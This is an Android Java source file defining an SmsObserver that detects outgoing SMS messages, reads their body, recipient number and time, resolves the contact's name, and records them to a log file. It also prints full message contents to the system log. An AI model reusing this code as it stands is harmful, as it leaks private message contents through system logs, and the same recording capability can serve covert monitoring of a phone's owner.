package com.depech.services.sms;

import java.util.Calendar;
import java.util.Date;
import java.util.Formatter;

import com.depech.utils.TelephonyFileLoger;

import android.content.ContentResolver;
import android.content.Context;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.provider.BaseColumns;
import android.provider.ContactsContract;
import android.util.Log;

public class SmsObserver extends ContentObserver {

	private Context mContext;

	private String contactId = "", contactName = "";
	private String smsBodyStr = "", phoneNoStr = "";
	private long smsDatTime = System.currentTimeMillis();
	static final Uri SMS_STATUS_URI = Uri.parse("content://sms");

	public SmsObserver(Handler handler, Context ctx) {
		super(handler);
		mContext = ctx;
	}

	public boolean deliverSelfNotifications() {
		return true;
	}

	public void onChange(boolean selfChange) {
		Cursor sms_sent_cursor = null;
		try {
			Log.e("Info", "Notification on SMS observer");
			sms_sent_cursor = mContext.getContentResolver().query(
					SMS_STATUS_URI, null, null, null, null);
			if (sms_sent_cursor != null) {
				if (sms_sent_cursor.moveToFirst()) {
					String protocol = sms_sent_cursor.getString(sms_sent_cursor
							.getColumnIndex("protocol"));
					Log.e("Info", "protocol : " + protocol);
					// for send protocol is null
					if (protocol == null) {
						/*
						 * String[] colNames = sms_sent_cursor.getColumnNames();
						 * if(colNames != null){ for(int k=0; k<colNames.length;
						 * k++){ Log.e("Info","colNames["+k+"] : " +
						 * colNames[k]); } }
						 */
						int type = sms_sent_cursor.getInt(sms_sent_cursor
								.getColumnIndex("type"));
						Log.e("Info", "SMS Type : " + type);
						// for actual state type=2
						if (type == 2) {
							Log.e("Info",
									"Id : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("_id")));
							Log.e("Info",
									"Thread Id : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("thread_id")));
							Log.e("Info",
									"Address : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("address")));
							Log.e("Info",
									"Person : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("person")));
							Log.e("Info",
									"Date : "
											+ sms_sent_cursor.getLong(sms_sent_cursor
													.getColumnIndex("date")));
							Log.e("Info",
									"Read : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("read")));
							Log.e("Info",
									"Status : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("status")));
							Log.e("Info",
									"Type : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("type")));
							Log.e("Info",
									"Rep Path Present : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("reply_path_present")));
							Log.e("Info",
									"Subject : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("subject")));
							Log.e("Info",
									"Body : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("body")));
							Log.e("Info",
									"Err Code : "
											+ sms_sent_cursor.getString(sms_sent_cursor
													.getColumnIndex("error_code")));

							smsBodyStr = sms_sent_cursor.getString(
									sms_sent_cursor.getColumnIndex("body"))
									.trim();
							phoneNoStr = sms_sent_cursor.getString(
									sms_sent_cursor.getColumnIndex("address"))
									.trim();
							smsDatTime = sms_sent_cursor
									.getLong(sms_sent_cursor
											.getColumnIndex("date"));

							Log.e("Info", "SMS Content : " + smsBodyStr);
							Log.e("Info", "SMS Phone No : " + phoneNoStr);
							Log.e("Info", "SMS Time : " + smsDatTime);
							logSMSToFile(smsDatTime, phoneNoStr, smsBodyStr);
						}
					}
				}
			} else
				Log.e("Info", "Send Cursor is Empty");
		} catch (Exception sggh) {
			Log.e("Error", "Error on onChange : " + sggh.toString());
		} finally {
			if (sms_sent_cursor != null) {
				sms_sent_cursor.close();
			}
		}
		super.onChange(selfChange);
	}

	private void logSMSToFile(Long date, String phone, String smsBody) {
		if (date != TelephonyFileLoger.getInstance().getPreviosRegistrDate()) {
			TelephonyFileLoger.getInstance().setPreviosRegistrDate(date);
			Date recivedTime = new Date(date);
			Formatter formater = new Formatter();
			try {
				formater.format("%s - %s%n%s%n%s%n", phone,
						getContactDisplayNameByNumber(phone), recivedTime,
						smsBody);
				TelephonyFileLoger.getInstance().writeToRegisteredSMSLog(
						formater.toString());
				System.out.println(formater);
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				formater.close();
			}
		}
	}

	public String getContactDisplayNameByNumber(String phone) {
		Uri uri = Uri.withAppendedPath(
				ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
				Uri.encode(phone));
		String name = "?";

		ContentResolver contentResolver = mContext.getContentResolver();
		Cursor contactLookup = contentResolver.query(uri, new String[] {
				BaseColumns._ID, ContactsContract.PhoneLookup.DISPLAY_NAME },
				null, null, null);

		try {
			if (contactLookup != null && contactLookup.getCount() > 0) {
				contactLookup.moveToNext();
				name = contactLookup.getString(contactLookup
						.getColumnIndex(ContactsContract.Data.DISPLAY_NAME));
				// String contactId =
				// contactLookup.getString(contactLookup.getColumnIndex(BaseColumns._ID));
			}
		} finally {
			if (contactLookup != null) {
				contactLookup.close();
			}
			if (contactLookup != null) {
				contactLookup.close();
			}
		}

		return name;
	}

}
